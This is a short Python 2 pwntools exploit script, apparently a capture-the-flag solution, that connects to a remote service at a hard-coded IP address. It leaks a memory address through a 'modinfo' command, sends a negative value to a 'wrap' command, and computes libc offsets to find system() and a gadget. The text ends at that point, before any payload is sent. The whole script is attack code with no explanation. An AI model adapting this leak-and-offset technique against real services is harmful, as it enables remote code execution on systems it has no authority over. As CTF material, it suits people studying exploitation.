from pwn import *
p=remote("35.198.185.193",1341)
p.recv()
p.sendline("modinfo")
p.recvline()
p.recvuntil("ess: ")
x=p.recvuntil("\n")[:-1][2:]
p.recv()
print x
print p64(int(x,16))
p.sendline("wrap")
p.sendline("-1")#20107C
p.recv()
p.recv()
offset= 0x7ffff75ef80a-0x7ffff7838dc0
wrap=int(x,16)+0x80a
system=wrap-offset
gadget=system-0x47dc0+0x20b8b
